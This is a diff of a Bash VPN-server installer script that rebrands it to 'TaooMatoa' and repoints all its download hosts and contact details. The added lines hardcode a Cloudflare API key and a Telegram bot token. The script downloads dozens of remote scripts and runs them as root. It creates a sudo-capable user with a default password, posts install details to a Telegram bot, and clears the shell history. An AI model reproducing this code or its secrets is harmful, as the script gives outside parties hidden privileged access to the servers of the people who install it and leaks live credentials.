@@ -49,7 +49,7 @@ export BOLD="\e[1m"
 export WARNING="${RED}\e[5m"
 export UNDERLINE="\e[4m"
 BURIQ () {
-curl -sS https://franata775.xcodehoster.com/vip/izin > /root/tmp
+curl -sS https://github.com/taoomatoa/izinvps > /root/tmp
 data=( `cat /root/tmp | grep -E "^### " | awk '{print $2}'` )
 for user in "${data[@]}"
 do
@@ -66,7 +66,7 @@ done
 rm -f  /root/tmp
 }
 MYIP=$(curl -sS ipv4.icanhazip.com)
-Name=$(curl -sS https://franata775.xcodehoster.com/vip/izin | grep $MYIP | awk '{print $2}')
+Name=$(curl -sS https://github.com/taoomatoa/izinvps | grep $MYIP | awk '{print $2}')
 echo $Name > /usr/local/etc/.$Name.ini
 CekOne=$(cat /usr/local/etc/.$Name.ini)
 Bloman () {
@@ -81,7 +81,7 @@ fi
 }
 PERMISSION () {
 MYIP=$(curl -sS ipv4.icanhazip.com)
-IZIN=$(curl -sS https://franata775.xcodehoster.com/vip/izin | awk '{print $4}' | grep $MYIP)
+IZIN=$(curl -sS https://github.com/taoomatoa/izinvps | awk '{print $4}' | grep $MYIP)
 if [ "$MYIP" = "$IZIN" ]; then
 Bloman
 else
@@ -106,7 +106,7 @@ echo "$localip $(hostname)" >> /etc/hosts
 fi
 mkdir -p /etc/xray
 echo -e " ${z}╭══════════════════════════════════════════════════════════╮${NC}"
-echo -e " ${z}│$NC\033[41m         Welcome To Script Premium FranataSTORE           $NC${z}│$NC"
+echo -e " ${z}│$NC\033[41m         Welcome To Script Premium TaooMatoa           $NC${z}│$NC"
 echo -e " ${z}╰══════════════════════════════════════════════════════════╯${NC}"
 sleep 2
 echo -e "[ ${green}INFO${NC} ] Preparing the install file"
@@ -129,8 +129,8 @@ echo -e "\033[1;93m────────────────────�
     echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
     echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
     echo -e "             \033[0;33mContact Admin :${NC}"
-    echo -e "      \033[0;36mTelegram${NC} @FranataSTORE"
-    echo -e "      ${GREEN}WhatsApp${NC} 6282241967317"
+    echo -e "      \033[0;36mTelegram${NC} @Taoomatoa_Bot"
+    echo -e "      ${GREEN}WhatsApp${NC} 6281293982957"
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
 rm setup.sh > /dev/null 2>&1
 sleep 10
@@ -207,10 +207,10 @@ mkdir -p /usr/bin/xray
 mkdir -p /etc/xray
 mkdir -p /usr/local/etc/xray
 sub=$(</dev/urandom tr -dc a-z0-9 | head -c5)
-DOMAIN=foryou-ssh.my.id
-SUB_DOMAIN=${sub}.foryou-ssh.my.id
-CF_ID=franata868@gmail.com
-CF_KEY=31ce32a5203088e0482bb33ef354b33093213
+DOMAIN=darmovps.my.id
+SUB_DOMAIN=${sub}.darmo.my.id
+CF_ID=angklingdarmo09gmail.com
+CF_KEY=0e2f726282d8e186c4a9327e9e4740ae
 set -euo pipefail
 IP=$(curl -sS ifconfig.me);
 echo "Updating DNS for ${SUB_DOMAIN}..."
@@ -328,8 +328,8 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="5109603347"
-    KEY="6206327239:AAEY-gCnoyfjQYWRuTU0R_Lp_y3ODehABsE"
+    CHATID="2144799664"
+    KEY="6159920026:AAHXNxeIG99KJkvNg_LAgqNhGsTEMen9_Mw"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="Installasi VPN Script Stable V2.0
@@ -350,7 +350,7 @@ function password_default() {
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
     ============================
-     AutoScript FranataSTORE V1.5
+     AutoScript TaooMatoa V1.5
     ============================
 "
 
@@ -362,56 +362,56 @@ echo -e "┌──────────────────────�
 echo -e " \E[41;1;39m           >>> Install Sistem <<<          \E[0m$NC"
 echo -e "└─────────────────────────────────────────┘"
 sleep 1
-wget -q https://franata775.xcodehoster.com/v1.5/tools/arzsource.sh && chmod +x arzsource.sh && ./arzsource.sh
+wget -q https://github.com/taoomatoa/src/tools/arzsource.sh && chmod +x arzsource.sh && ./arzsource.sh
 echo -e "┌─────────────────────────────────────────┐"
 echo -e " \E[41;1;39m          >>> Install SSH / WS <<<        \E[0m$NC"
 echo -e "└─────────────────────────────────────────┘"
 sleep 1
-wget -q https://franata775.xcodehoster.com/v1.5/tools/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+wget -q https://github.com/taoomatoa/src/tools/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
 echo -e "┌─────────────────────────────────────────┐"
 echo -e " \E[41;1;39m            >>> Install Xray <<<         \E[0m$NC"
 echo -e "└─────────────────────────────────────────┘"
 sleep 1
-wget -q https://franata775.xcodehoster.com/v1.5/tools/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+wget -q https://github.com/taoomatoa/src/tools/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
 echo -e "┌─────────────────────────────────────────┐"
 echo -e " \E[41;1;39m            >>> Install BR <<<           \E[0m$NC"
 echo -e "└─────────────────────────────────────────┘"
 sleep 1
-wget -q https://franata775.xcodehoster.com/v1.5/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
+wget -q https://github.com/taoomatoa/src/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh
 echo -e "┌─────────────────────────────────────────┐"
 echo -e " \E[41;1;39m            >>> Install slowdns <<<           \E[0m$NC"
 echo -e "└─────────────────────────────────────────┘"
 sleep 1
 wget https://raw.githubusercontent.com/Andyvpn/Autoscript-by-azi/main/autoscript-ssh-slowdns-main/slowdns.sh && chmod +x slowdns.sh && ./slowdns.sh
 echo -e "${GREEN}Download Data${NC}"
-wget -q -O /usr/bin/usernew "https://franata775.xcodehoster.com/v1.5/usernew.sh"
-wget -q -O /usr/bin/add-ws "https://franata775.xcodehoster.com/v1.5/add-ws.sh"
-wget -q -O /usr/bin/add-ssws "https://franata775.xcodehoster.com/v1.5/add-ssws.sh"
-wget -q -O /usr/bin/add-vless "https://franata775.xcodehoster.com/v1.5/add-vless.sh"
-wget -q -O /usr/bin/add-tr "https://franata775.xcodehoster.com/v1.5/add-tr.sh"
-wget -q -O /usr/bin/autoreboot "https://franata775.xcodehoster.com/v1.5/options/autoreboot.sh"
-wget -q -O /usr/bin/restart "https://franata775.xcodehoster.com/v1.5/options/restart.sh"
-wget -q -O /usr/bin/tendang "https://franata775.xcodehoster.com/v1.5/options/tendang.sh"
-wget -q -O /usr/bin/clearlog "https://franata775.xcodehoster.com/v1.5/options/clearlog.sh"
-wget -q -O /usr/bin/running "https://franata775.xcodehoster.com/v1.5/options/running.sh"
-wget -q -O /usr/bin/speedtest "https://franata775.xcodehoster.com/v1.5/tools/speedtest_cli.py"
-wget -q -O /usr/bin/cek-bandwidth "https://franata775.xcodehoster.com/v1.5/options/cek-bandwidth.sh"
-wget -q -O /usr/bin/limitspeed "https://franata775.xcodehoster.com/v1.5/options/limitspeed.sh"
-wget -q -O /usr/bin/menu-vless "https://franata775.xcodehoster.com/v1.5/menu/menu-vless.sh"
-wget -q -O /usr/bin/menu-vmess "https://franata775.xcodehoster.com/v1.5/menu/menu-vmess.sh"
-wget -q -O /usr/bin/menu-ss "https://franata775.xcodehoster.com/v1.5/menu/menu-ss.sh"
-wget -q -O /usr/bin/menu-trojan "https://franata775.xcodehoster.com/v1.5/menu/menu-trojan.sh"
-wget -q -O /usr/bin/menu-ssh "https://franata775.xcodehoster.com/v1.5/menu/menu-ssh.sh"
-wget -q -O /usr/bin/menu-backup "https://franata775.xcodehoster.com/v1.5/menu/menu-backup.sh"
-wget -q -O /usr/bin/menu "https://franata775.xcodehoster.com/v1.5/menu/menu.sh"
-wget -q -O /usr/bin/webmin "https://franata775.xcodehoster.com/v1.5/options/webmin.sh"
-wget -q -O /usr/bin/xp "https://franata775.xcodehoster.com/v1.5/xp.sh"
-wget -q -O /usr/bin/update "https://franata775.xcodehoster.com/v1.5/options/update.sh"
-wget -q -O /usr/bin/addhost "https://franata775.xcodehoster.com/v1.5/menu/addhost.sh"
-wget -q -O /usr/bin/certxray "https://franata775.xcodehoster.com/v1.5/menu/crt.sh"
-wget -q -O /usr/bin/menu-set "https://franata775.xcodehoster.com/v1.5/menu/menu-set.sh"
-wget -q -O /usr/bin/info "https://franata775.xcodehoster.com/v1.5/options/info.sh"
-wget -q -O /usr/bin/infoserv "https://franata775.xcodehoster.com/v1.5/options/infoserv.sh"
+wget -q -O /usr/bin/usernew "https://github.com/taoomatoa/src/usernew.sh"
+wget -q -O /usr/bin/add-ws "https://github.com/taoomatoa/src/add-ws.sh"
+wget -q -O /usr/bin/add-ssws "https://github.com/taoomatoa/src/add-ssws.sh"
+wget -q -O /usr/bin/add-vless "https://github.com/taoomatoa/src/add-vless.sh"
+wget -q -O /usr/bin/add-tr "https://github.com/taoomatoa/src/add-tr.sh"
+wget -q -O /usr/bin/autoreboot "https://github.com/taoomatoa/src/options/autoreboot.sh"
+wget -q -O /usr/bin/restart "https://github.com/taoomatoa/src/options/restart.sh"
+wget -q -O /usr/bin/tendang "https://github.com/taoomatoa/src/options/tendang.sh"
+wget -q -O /usr/bin/clearlog "https://github.com/taoomatoa/src/options/clearlog.sh"
+wget -q -O /usr/bin/running "https://github.com/taoomatoa/src/options/running.sh"
+wget -q -O /usr/bin/speedtest "https://github.com/taoomatoa/src/tools/speedtest_cli.py"
+wget -q -O /usr/bin/cek-bandwidth "https://github.com/taoomatoa/src/options/cek-bandwidth.sh"
+wget -q -O /usr/bin/limitspeed "https://github.com/taoomatoa/src/options/limitspeed.sh"
+wget -q -O /usr/bin/menu-vless "https://github.com/taoomatoa/src/menu/menu-vless.sh"
+wget -q -O /usr/bin/menu-vmess "https://github.com/taoomatoa/src/menu/menu-vmess.sh"
+wget -q -O /usr/bin/menu-ss "https://github.com/taoomatoa/src/menu/menu-ss.sh"
+wget -q -O /usr/bin/menu-trojan "https://github.com/taoomatoa/src/menu/menu-trojan.sh"
+wget -q -O /usr/bin/menu-ssh "https://github.com/taoomatoa/src/menu/menu-ssh.sh"
+wget -q -O /usr/bin/menu-backup "https://github.com/taoomatoa/src/menu/menu-backup.sh"
+wget -q -O /usr/bin/menu "https://github.com/taoomatoa/src/menu/menu.sh"
+wget -q -O /usr/bin/webmin "https://github.com/taoomatoa/src/options/webmin.sh"
+wget -q -O /usr/bin/xp "https://github.com/taoomatoa/src/xp.sh"
+wget -q -O /usr/bin/update "https://github.com/taoomatoa/src/options/update.sh"
+wget -q -O /usr/bin/addhost "https://github.com/taoomatoa/src/menu/addhost.sh"
+wget -q -O /usr/bin/certxray "https://github.com/taoomatoa/src/menu/crt.sh"
+wget -q -O /usr/bin/menu-set "https://github.com/taoomatoa/src/menu/menu-set.sh"
+wget -q -O /usr/bin/info "https://github.com/taoomatoa/src/options/info.sh"
+wget -q -O /usr/bin/infoserv "https://github.com/taoomatoa/src/options/infoserv.sh"
 chmod +x /usr/bin/usernew
 chmod +x /usr/bin/add-ws
 chmod +x /usr/bin/add-ssws
@@ -477,7 +477,7 @@ if [ ! -f "/etc/log-create-user.log" ]; then
 echo "Log All Account " > /etc/log-create-user.log
 fi
 history -c
-serverV=$( curl -sS https://franata775.xcodehoster.com/v1.5/version  )
+serverV=$( curl -sS https://github.com/taoomatoa/src/version  )
 echo $serverV > /opt/.ver
 aureb=$(cat /home/re_otm)
 b=11
